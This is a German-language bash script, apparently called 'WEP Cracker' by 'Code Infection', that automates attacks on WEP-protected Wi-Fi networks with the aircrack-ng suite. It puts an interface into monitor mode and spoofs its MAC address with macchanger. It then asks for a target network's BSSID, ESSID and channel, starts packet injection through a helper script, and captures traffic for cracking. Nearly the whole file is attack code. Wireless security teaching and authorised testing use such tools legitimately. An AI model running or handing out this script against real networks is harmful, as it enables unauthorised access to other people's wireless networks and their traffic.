#!/bin/bash

function printError ()
{
	echo -e "\033[41m\033[37m\033[4m"$1"\033[0m"
}

function finish ()
{
	airmon-ng stop $interface
	airmon-ng stop $mon
}

clear
echo "Willkommen im WEP Cracker von Code Infection" 
echo 
echo 
if [ -z "$(which airmon-ng)" ]
then
	printError "airmon-ng existiert nicht!"
elif [ -z "$(which airodump-ng)" ]
then
	printError "airodump-ng existiert nicht!"
elif [ -z "$(which aireplay-ng)" ]
then
	printError "aireplay-ng existiert nicht!"
elif [ -z "$(which aircrack-ng)" ]
then
	printError "aircrack-ng existiert nicht!"
elif [ -z "$(which macchanger)" ]
then
	printError "macchanger existiert nicht!"
fi

clear
airmon-ng
echo "Gib das Interface an, welches du starten möchtest: "
read interface

clear
airmon-ng start $interface
echo "Gib nun das Interface ein, mit dem du monitoren möchtest: "
read mon

ifconfig $mon down
macchanger --mac 00:11:22:33:44:55 $mon > /dev/null
ifconfig $mon up

xterm -e "./killproc.sh" "airodump-ng" 10 &
clear
airodump-ng $interface
echo "Gib die BSSID ein, die du angreifen willst: "
read bssid
echo "Und nun noch dessen ESSID: "
read essid
echo "Und dessen Channel: "
read channel


clear
echo "In 3 Sekunden startet das Monitoring und die injection..."
sleep 3
xterm -e "./inject.sh" $bssid $essid $channel $mon &

clear
rm  "dumps/*"
airodump-ng -c $channel -w "dumps/dump" --bssid $bssid $mon

finish > /dev/null